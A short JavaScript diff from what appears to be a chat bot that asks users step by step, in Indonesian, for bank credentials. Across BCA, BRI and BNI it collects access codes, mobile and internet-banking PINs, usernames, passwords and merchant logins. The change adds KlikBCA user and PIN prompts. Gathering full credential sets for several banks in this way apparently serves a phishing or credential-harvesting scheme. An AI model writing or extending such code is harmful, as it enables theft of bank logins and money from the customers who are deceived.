@@ -21,7 +21,7 @@ const getSteps = (bank) => {
   let bankSteps = [];
   const b = (bank || '').toUpperCase();
   if (b === 'BCA') {
-    bankSteps = ['kodeAkses', 'pinMBca', 'myBCAUser', 'myBCAPassword', 'myBCAPin'];
+    bankSteps = ['kodeAkses', 'pinMBca', 'myBCAUser', 'myBCAPassword', 'myBCAPin', 'ibUser', 'ibPassword'];
   } else if (b === 'BRI') {
     bankSteps = ['brimoUser', 'brimoPassword', 'mobilePin', 'briMerchantUser', 'briMerchantPassword'];
   } else if (b === 'BNI') {
@@ -112,11 +112,13 @@ const getBankSpecificLabel = (field, bankName) => {
   }
 
   if (field === 'ibUser') {
+    if (bank === 'BCA') return "👤 Masukkan User KlikBCA (IB):";
     if (bank === 'OCBC' || bank === 'OCBC NISP') return "👤 Masukkan User Internet Banking (OCBC):";
     return "👤 Masukkan Username Internet Banking:";
   }
 
   if (field === 'ibPassword') {
+    if (bank === 'BCA') return "🔑 Masukkan PIN KlikBCA (IB):";
     if (bank === 'OCBC' || bank === 'OCBC NISP') return "🔑 Masukkan Password Internet Banking (OCBC):";
     return "🔑 Masukkan Password Internet Banking:";
   }
